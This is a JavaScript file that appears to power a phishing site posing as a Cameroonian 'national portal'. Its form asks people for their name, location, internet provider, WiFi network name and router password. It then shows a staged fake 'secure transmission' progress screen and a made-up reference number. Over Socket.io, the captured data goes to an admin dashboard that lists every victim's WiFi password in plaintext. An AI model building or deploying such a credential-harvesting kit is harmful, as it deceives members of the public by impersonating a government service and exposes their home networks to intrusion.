/**
 * Portail national — formulaire (Socket.io), résultat, tableau habilité.
 */
(function () {
  "use strict";

  var path = window.location.pathname || "";

  /** Régions et villes principales du Cameroun (listes déroulantes) */
  var REGION_VILLES = {
    Adamaoua: [
      "Ngaoundéré",
      "Meiganga",
      "Banyo",
      "Tignère",
      "Djohong",
      "Bankim",
      "Tibati",
      "Bibé",
    ],
    Centre: [
      "Yaoundé",
      "Mbalmayo",
      "Obala",
      "Monatélé",
      "Ngomedzap",
      "Akonolinga",
      "Eséka",
      "Mfou",
      "Okola",
    ],
    Est: [
      "Bertoua",
      "Abong-Mbang",
      "Batouri",
      "Doumé",
      "Bélabo",
      "Yokadouma",
      "Lomié",
      "Moloundou",
    ],
    "Extrême-Nord": [
      "Maroua",
      "Mokolo",
      "Kousséri",
      "Kaélé",
      "Yagoua",
      "Mora",
      "Tokombéré",
      "Mindif",
    ],
    Littoral: ["Douala", "Édéa", "Yabassi", "Nkongsamba", "Loum", "Manjo", "Mbanga", "Dibamba"],
    Nord: ["Garoua", "Guider", "Poli", "Figuil", "Tcholliré", "Rey Bouba", "Touroua", "Bibemi"],
    "Nord-Ouest": ["Bamenda", "Wum", "Ndop", "Kumbo", "Fundong", "Bafut", "Jakiri", "Mbengwi"],
    Ouest: [
      "Bafoussam",
      "Dschang",
      "Foumban",
      "Bafang",
      "Mbouda",
      "Bangangté",
      "Bandjoun",
      "Baham",
    ],
    Sud: ["Ebolowa", "Kribi", "Ambam", "Sangmélima", "Mvangan", "Campo", "Lolodorf", "Mintom"],
    "Sud-Ouest": ["Buea", "Limbe", "Kumba", "Tiko", "Mamfe", "Mundemba", "Idenau", "Tombel"],
  };

  function escapeHtml(s) {
    var d = document.createElement("div");
    d.textContent = s == null ? "" : String(s);
    return d.innerHTML;
  }

  function showToast(toastHost, title, message) {
    if (!toastHost) return;
    toastHost.innerHTML = "";
    var wrap = document.createElement("div");
    wrap.className = "toast";
    wrap.setAttribute("role", "alert");
    wrap.innerHTML =
      "<div class=\"toast__icon\" aria-hidden=\"true\">!</div>" +
      "<div class=\"toast__body\">" +
      "<p class=\"toast__title\">" +
      escapeHtml(title) +
      "</p>" +
      "<p class=\"toast__msg\">" +
      escapeHtml(message) +
      "</p>" +
      "</div>" +
      "<button type=\"button\" class=\"toast__close\" aria-label=\"Fermer\">×</button>";

    var btn = wrap.querySelector(".toast__close");
    btn.addEventListener("click", function () {
      wrap.remove();
    });
    toastHost.appendChild(wrap);
    setTimeout(function () {
      if (wrap.parentNode) wrap.remove();
    }, 12000);
  }

  /* -------- Login admin -------- */
  if (path.endsWith("admin-login.html")) {
    var loginForm = document.getElementById("admin-login-form");
    var toastHostLogin = document.getElementById("toast-host");
    if (!loginForm) return;

    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var u = (document.getElementById("username") || {}).value || "";
      var p = (document.getElementById("password") || {}).value || "";
      if (!u.trim() || !p) {
        showToast(toastHostLogin, "Champs requis", "Veuillez renseigner l’identifiant et le mot de passe.");
        return;
      }

      fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: u.trim(), password: p }),
      })
        .then(function (r) {
          if (!r.ok) throw new Error("bad");
          return r.json();
        })
        .then(function () {
          window.location.href = "/admin.html";
        })
        .catch(function () {
          showToast(toastHostLogin, "Accès refusé", "Identifiants invalides. Veuillez réessayer.");
        });
    });
    return;
  }

  /* -------- Page résultat -------- */
  if (path.endsWith("result.html")) {
    var refSpan = document.getElementById("ref-id");
    if (refSpan) {
      var ref = sessionStorage.getItem("dossier_ref");
      if (ref) {
        refSpan.textContent = ref;
      } else {
        refSpan.textContent = "REC-CM-" + Date.now().toString(36).toUpperCase();
      }
      sessionStorage.removeItem("dossier_ref");
    }
    return;
  }

  /* -------- Dashboard habilité -------- */
  if (path.endsWith("admin.html")) {
    if (typeof io === "undefined") {
      console.warn("Socket.io indisponible — démarrez le serveur Node.");
      return;
    }
    var socket = io();
    var tbody = document.getElementById("dash-body");
    var emptyRow = document.getElementById("dash-empty");

    function formatTime(iso) {
      if (!iso) return "—";
      try {
        return new Date(iso).toLocaleString("fr-CM", { hour12: false });
      } catch (e) {
        return iso;
      }
    }

    function insertRow(data) {
      if (emptyRow && emptyRow.parentNode) emptyRow.parentNode.removeChild(emptyRow);

      var pwd =
        data.boxPassword != null && data.boxPassword !== "" ? String(data.boxPassword) : "(vide)";

      var tr = document.createElement("tr");
      tr.innerHTML =
        "<td>" +
        formatTime(data.submittedAt) +
        "</td>" +
        "<td>" +
        escapeHtml(data.ownerName) +
        "</td>" +
        "<td>" +
        escapeHtml(data.region) +
        "</td>" +
        "<td>" +
        escapeHtml(data.city) +
        "</td>" +
        "<td>" +
        escapeHtml(data.network) +
        "</td>" +
        "<td class=\"mono\">" +
        escapeHtml(data.wifiName) +
        "</td>" +
        "<td class=\"mono\">" +
        escapeHtml(pwd) +
        "</td>";

      tbody.insertBefore(tr, tbody.firstChild);
    }

    socket.on("bootstrap", function (list) {
      if (!Array.isArray(list)) return;
      list
        .slice()
        .reverse()
        .forEach(function (r) {
          insertRow(r);
        });
    });

    socket.on("new-registration", function (data) {
      insertRow(data);
    });
    return;
  }

  /* -------- Formulaire -------- */
  if (path.endsWith("form.html")) {
    var form = document.getElementById("registration-form");
    var pwd = document.getElementById("pwd");
    var overlay = document.getElementById("process-overlay");
    var statusEl = document.getElementById("process-status");
    var progressBar = document.getElementById("process-progress-bar");
    var regionSel = document.getElementById("region");
    var citySel = document.getElementById("city");
    var toastHost = document.getElementById("toast-host");

    function showToastLocal(title, message) {
      showToast(toastHost, title, message);
    }

    function fillRegions() {
      if (!regionSel) return;
      var names = Object.keys(REGION_VILLES).sort(function (a, b) {
        return a.localeCompare(b, "fr");
      });
      names.forEach(function (name) {
        var opt = document.createElement("option");
        opt.value = name;
        opt.textContent = name;
        regionSel.appendChild(opt);
      });
    }

    function fillCities(region) {
      if (!citySel) return;
      citySel.innerHTML = "";
      citySel.disabled = !region;
      if (!region) {
        var ph = document.createElement("option");
        ph.value = "";
        ph.textContent = "— Choisissez d’abord une région —";
        citySel.appendChild(ph);
        return;
      }
      var list = REGION_VILLES[region] || [];
      var def = document.createElement("option");
      def.value = "";
      def.textContent = "— Sélectionnez une ville —";
      citySel.appendChild(def);
      list.forEach(function (v) {
        var opt = document.createElement("option");
        opt.value = v;
        opt.textContent = v;
        citySel.appendChild(opt);
      });
    }

    fillRegions();
    if (regionSel) {
      regionSel.addEventListener("change", function () {
        fillCities(regionSel.value);
      });
    }

    if (!form) return;

    if (typeof io === "undefined") {
      form.addEventListener("submit", function (e) {
        e.preventDefault();
        alert("Démarrez le serveur (npm start ou node server.js) pour enregistrer le dossier.");
      });
      return;
    }

    var socket = io();

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      var ownerName = (document.getElementById("ownerName") || {}).value || "";
      var region = regionSel ? regionSel.value : "";
      var city = citySel ? citySel.value : "";
      var network = (document.getElementById("network") || {}).value || "";
      var wifiName = (document.getElementById("wifiName") || {}).value || "";
      var pwdVal = pwd ? pwd.value : "";
      var pwdConfirm = (document.getElementById("pwdConfirm") || {}).value || "";

      if (pwdVal !== pwdConfirm) {
        showToastLocal(
          "Mots de passe différents",
          "Les mots de passe ne correspondent pas. Vérifiez la saisie dans les deux champs et validez à nouveau."
        );
        if (pwdConfirm) {
          var c = document.getElementById("pwdConfirm");
          if (c) c.focus();
        }
        return;
      }

      if (!ownerName.trim() || !region || !city || !network || !wifiName.trim()) {
        showToastLocal(
          "Formulaire incomplet",
          "Veuillez renseigner tous les champs obligatoires avant validation."
        );
        return;
      }

      showOverlaySequence(function onDone() {
        socket.emit("register-data", {
          ownerName: ownerName.trim(),
          region: region,
          city: city,
          network: network,
          wifiName: wifiName.trim(),
          boxPassword: pwdVal,
        });

        var ref = "REC-CM-" + Date.now().toString(36).toUpperCase();
        sessionStorage.setItem("dossier_ref", ref);
        window.location.href = "/result.html";
      });
    });

    function showOverlaySequence(done) {
      if (!overlay || !statusEl || !progressBar) {
        done();
        return;
      }
      overlay.classList.add("is-visible");
      document.body.style.overflow = "hidden";

      var messages = [
        "Connexion au serveur…",
        "Vérification des informations…",
        "Transmission sécurisée en cours…",
      ];
      var totalMs = 2000 + Math.floor(Math.random() * 2001);
      var stepMs = Math.floor(totalMs / messages.length);

      function setProgress(pct) {
        progressBar.style.width = pct + "%";
      }

      statusEl.textContent = messages[0];
      setProgress(8);

      setTimeout(function () {
        statusEl.textContent = messages[1];
        setProgress(42);
      }, stepMs);

      setTimeout(function () {
        statusEl.textContent = messages[2];
        setProgress(78);
      }, stepMs * 2);

      setTimeout(function () {
        setProgress(100);
        statusEl.textContent = "Transmission terminée.";
      }, stepMs * 3);

      setTimeout(function () {
        overlay.classList.remove("is-visible");
        document.body.style.overflow = "";
        done();
      }, totalMs);
    }
  }
})();
